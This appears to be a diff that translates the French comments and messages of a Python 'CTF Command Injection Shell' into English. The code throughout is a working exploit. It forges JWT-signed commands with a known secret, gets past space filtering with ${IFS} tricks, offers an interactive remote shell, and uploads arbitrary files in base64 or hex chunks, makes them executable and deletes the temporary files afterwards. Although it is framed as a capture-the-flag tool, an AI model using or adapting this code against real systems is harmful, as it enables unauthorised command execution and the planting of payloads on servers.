@@ -14,14 +14,14 @@ class Shell:
         self.get_initial_dir()
     
     def get_initial_dir(self):
-        """Récupère le répertoire initial"""
+        """Get the initial directory"""
         result = self.exploit("pwd")
         if result:
             self.current_dir = result.strip()
-            print(f"[*] Répertoire initial : {self.current_dir}")
+            print(f"[*] Initial directory: {self.current_dir}")
     
     def exploit(self, command):
-        """Exécute une commande sur le serveur"""
+        """Execute a command on the server"""
         encoded_jwt = jwt.encode({"cmd": command}, SECRET, algorithm="HS256")
         headers = {
             'Authorization': 'Bearer ' + encoded_jwt,
@@ -30,7 +30,7 @@ class Shell:
         return response.text
     
     def execute_with_context(self, command):
-        """Exécute une commande dans le contexte du répertoire courant"""
+        """Execute a command in the current directory context"""
         if self.current_dir:
             full_command = f"cd${{IFS}}{self.current_dir}${{IFS}}&&${{IFS}}{command}"
         else:
@@ -39,12 +39,12 @@ class Shell:
         return self.exploit(full_command)
     
     def change_directory(self, path):
-        """Change le répertoire courant"""
+        """Change the current directory"""
         if not path:
-            # cd sans argument = home
+            # cd without argument = home
             test_cmd = "cd${{IFS}}&&${{IFS}}pwd"
         else:
-            # cd vers un chemin spécifique
+            # cd to a specific path
             safe_path = path.replace(" ", "${IFS}")
             test_cmd = f"cd${{IFS}}{safe_path}${{IFS}}&&${{IFS}}pwd"
         
@@ -52,28 +52,28 @@ class Shell:
         
         if result and "No such file or directory" not in result and result.strip():
             self.current_dir = result.strip()
-            print(f"[+] Répertoire courant : {self.current_dir}")
+            print(f"[+] Current directory: {self.current_dir}")
             return True
         else:
-            print(f"[!] Impossible de changer vers : {path}")
-            print(f"[!] Erreur : {result}")
+            print(f"[!] Unable to change to: {path}")
+            print(f"[!] Error: {result}")
             return False
     
     def upload_file(self, local_file, remote_path=None):
-        """Upload un fichier sur le serveur - méthode améliorée"""
+        """Upload a file to the server - improved method"""
         try:
             with open(local_file, "rb") as f:
                 content = f.read()
             
-            # Générer un nom temporaire aléatoire
+            # Generate a random temporary name
             rand_tmp = random.randrange(10000, 99999)
             
-            # Encoder le fichier en base64
+            # Encode file in base64
             b64_content = base64.b64encode(content).decode()
             
-            print(f"[*] Upload de {local_file} ({len(content)} bytes, {len(b64_content)} bytes encodés)")
+            print(f"[*] Uploading {local_file} ({len(content)} bytes, {len(b64_content)} bytes encoded)")
             
-            # Déterminer le chemin de destination
+            # Determine destination path
             if remote_path is None:
                 if self.current_dir:
                     remote_path = f"{self.current_dir}/{local_file}"
@@ -84,88 +84,88 @@ class Shell:
             
             tmp_file = f"/tmp/.upload_{rand_tmp}"
             
-            # Nettoyer d'abord si le fichier existe
+            # Clean up first if file exists
             self.exploit(f"rm${{IFS}}-f${{IFS}}{tmp_file}")
             time.sleep(0.1)
             
-            # Découper en petits chunks (plus petits pour éviter les problèmes)
+            # Split into small chunks (smaller to avoid issues)
             chunk_size = 3000
             total_chunks = (len(b64_content) + chunk_size - 1) // chunk_size
             
-            print(f"[*] Envoi en {total_chunks} chunks...")
+            print(f"[*] Sending in {total_chunks} chunks...")
             
             for i in range(0, len(b64_content), chunk_size):
                 chunk = b64_content[i:i+chunk_size]
                 chunk_num = (i // chunk_size) + 1
                 
-                # Méthode 1 : Utiliser printf au lieu d'echo pour éviter les problèmes d'échappement
+                # Method 1: Use printf instead of echo to avoid escaping issues
                 cmd = f"printf${{IFS}}'%s'${{IFS}}'{chunk}'>>{tmp_file}"
                 
                 result = self.exploit(cmd)
                 
-                # Petit délai entre les chunks
+                # Small delay between chunks
                 time.sleep(0.05)
                 
-                print(f"[*] Chunk {chunk_num}/{total_chunks} envoyé", end='\r')
+                print(f"[*] Chunk {chunk_num}/{total_chunks} sent", end='\r')
             
-            print(f"\n[+] Tous les chunks envoyés vers {tmp_file}")
+            print(f"\n[+] All chunks sent to {tmp_file}")
             
-            # Vérifier que le fichier temporaire existe et a la bonne taille
+            # Verify that temporary file exists and has the right size
             check_cmd = f"wc${{IFS}}-c${{IFS}}{tmp_file}"
             check_result = self.exploit(check_cmd)
-            print(f"[*] Taille du fichier encodé : {check_result.strip()}")
+            print(f"[*] Encoded file size: {check_result.strip()}")
             
-            # Décoder le fichier
-            print(f"[*] Décodage vers {remote_path}...")
+            # Decode the file
+            print(f"[*] Decoding to {remote_path}...")
             decode_cmd = f"base64${{IFS}}-d${{IFS}}{tmp_file}>{remote_path}"
             decode_result = self.exploit(decode_cmd)
             
             time.sleep(0.2)
             
-            # Rendre exécutable
+            # Make executable
             chmod_cmd = f"chmod${{IFS}}+x${{IFS}}{remote_path}"
             self.exploit(chmod_cmd)
             
-            # Vérifier l'upload final
+            # Verify final upload
             verify_cmd = f"ls${{IFS}}-lh${{IFS}}{remote_path}"
             verification = self.exploit(verify_cmd)
             
             if verification and "No such file" not in verification:
-                print(f"[+] Upload réussi !")
-                print(f"[+] Vérification :\n{verification}")
+                print(f"[+] Upload successful!")
+                print(f"[+] Verification:\n{verification}")
                 
-                # Vérifier le contenu (premiers bytes)
+                # Check content (first bytes)
                 head_cmd = f"head${{IFS}}-c${{IFS}}50${{IFS}}{remote_path}"
                 head_result = self.exploit(head_cmd)
-                print(f"[*] Début du fichier : {repr(head_result[:50])}")
+                print(f"[*] File start: {repr(head_result[:50])}")
             else:
-                print(f"[!] Erreur : le fichier n'a pas été créé correctement")
-                print(f"[!] Résultat : {verification}")
+                print(f"[!] Error: file was not created correctly")
+                print(f"[!] Result: {verification}")
             
-            # Nettoyer le fichier temporaire
+            # Clean up temporary file
             clean_cmd = f"rm${{IFS}}-f${{IFS}}{tmp_file}"
             self.exploit(clean_cmd)
             
             return True
             
         except FileNotFoundError:
-            print(f"[!] Fichier {local_file} introuvable")
+            print(f"[!] File {local_file} not found")
             return False
         except Exception as e:
-            print(f"[!] Erreur lors de l'upload : {e}")
+            print(f"[!] Error during upload: {e}")
             import traceback
             traceback.print_exc()
             return False
     
     def upload_file_hex(self, local_file, remote_path=None):
-        """Upload un fichier en utilisant le format hexadécimal (alternative)"""
+        """Upload a file using hexadecimal format (alternative)"""
         try:
             with open(local_file, "rb") as f:
                 content = f.read()
             
-            print(f"[*] Upload de {local_file} en hex ({len(content)} bytes)")
+            print(f"[*] Uploading {local_file} in hex ({len(content)} bytes)")
             
-            # Déterminer le chemin de destination
+            # Determine destination path
             if remote_path is None:
                 if self.current_dir:
                     remote_path = f"{self.current_dir}/{local_file}"
@@ -174,16 +174,16 @@ class Shell:
             elif not remote_path.startswith('/'):
                 remote_path = f"{self.current_dir}/{remote_path}"
             
-            # Convertir en hex
+            # Convert to hex
             hex_content = content.hex()
             
             rand_tmp = random.randrange(10000, 99999)
             tmp_file = f"/tmp/.hex_{rand_tmp}"
             
-            # Nettoyer
+            # Clean up
             self.exploit(f"rm${{IFS}}-f${{IFS}}{tmp_file}")
             
-            # Envoyer en chunks
+            # Send in chunks
             chunk_size = 4000
             total_chunks = (len(hex_content) + chunk_size - 1) // chunk_size
             
@@ -195,60 +195,60 @@ class Shell:
                 self.exploit(cmd)
                 time.sleep(0.05)
                 
-                print(f"[*] Chunk {chunk_num}/{total_chunks} envoyé", end='\r')
+                print(f"[*] Chunk {chunk_num}/{total_chunks} sent", end='\r')
             
-            print(f"\n[*] Décodage hexadécimal...")
+            print(f"\n[*] Hex decoding...")
             
-            # Décoder avec xxd
+            # Decode with xxd
             decode_cmd = f"xxd${{IFS}}-r${{IFS}}-p${{IFS}}{tmp_file}>{remote_path}"
             self.exploit(decode_cmd)
             
             # Chmod
             self.exploit(f"chmod${{IFS}}+x${{IFS}}{remote_path}")
             
-            # Vérifier
+            # Verify
             verify_cmd = f"ls${{IFS}}-lh${{IFS}}{remote_path}"
             verification = self.exploit(verify_cmd)
-            print(f"[+] Vérification :\n{verification}")
+            print(f"[+] Verification:\n{verification}")
             
-            # Nettoyer
+            # Clean up
             self.exploit(f"rm${{IFS}}-f${{IFS}}{tmp_file}")
             
             return True
             
         except Exception as e:
-            print(f"[!] Erreur : {e}")
+            print(f"[!] Error: {e}")
             return False
 
 def main():
     print("="*60)
     print("CTF Command Injection Shell with CD support")
     print("="*60)
-    print("Commandes spéciales :")
-    print("  cd <path>                    - Changer de répertoire")
-    print("  upload <local> [remote]      - Upload un fichier (base64)")
-    print("  uploadhex <local> [remote]   - Upload un fichier (hex)")
-    print("  pwd                          - Afficher le répertoire courant")
-    print("  exit/quit                    - Quitter")
+    print("Special commands:")
+    print("  cd <path>                    - Change directory")
+    print("  upload <local> [remote]      - Upload a file (base64)")
+    print("  uploadhex <local> [remote]   - Upload a file (hex)")
+    print("  pwd                          - Show current directory")
+    print("  exit/quit                    - Exit")
     print("="*60 + "\n")
     
     shell = Shell()
     
     while True:
         try:
-            # Afficher le prompt avec le répertoire courant
+            # Display prompt with current directory
             prompt = f"[{shell.current_dir or '?'}]$ "
             command = input(prompt).strip()
             
             if not command:
                 continue
             
-            # Commande exit
+            # Exit command
             if command.lower() in ['exit', 'quit']:
                 print("[*] Bye!")
                 break
             
-            # Commande cd
+            # cd command
             if command.startswith("cd ") or command == "cd":
                 if command == "cd":
                     path = ""
@@ -257,12 +257,12 @@ def main():
                 shell.change_directory(path)
                 continue
             
-            # Commande pwd
+            # pwd command
             if command == "pwd":
                 print(shell.current_dir)
                 continue
             
-            # Commande upload
+            # upload command
             if command.startswith("upload "):
                 parts = command.split(maxsplit=2)
                 if len(parts) == 2:
@@ -273,7 +273,7 @@ def main():
                     print("[!] Usage: upload <local_file> [remote_path]")
                 continue
             
-            # Commande uploadhex (alternative)
+            # uploadhex command (alternative)
             if command.startswith("uploadhex "):
                 parts = command.split(maxsplit=2)
                 if len(parts) == 2:
@@ -284,7 +284,7 @@ def main():
                     print("[!] Usage: uploadhex <local_file> [remote_path]")
                 continue
             
-            # Commande normale - remplacer les espaces et exécuter avec contexte
+            # Normal command - replace spaces and execute with context
             safe_command = command.replace(" ", "${IFS}")
             result = shell.execute_with_context(safe_command)
             
@@ -293,12 +293,12 @@ def main():
                 if not result.endswith('\n'):
                     print()
             else:
-                print("[!] Pas de sortie")
+                print("[!] No output")
                 
         except KeyboardInterrupt:
-            print("\n[*] Utilisez 'exit' pour quitter")
+            print("\n[*] Use 'exit' to quit")
         except Exception as e:
-            print(f"[!] Erreur : {e}")
+            print(f"[!] Error: {e}")
 
 if __name__ == "__main__":
     main()
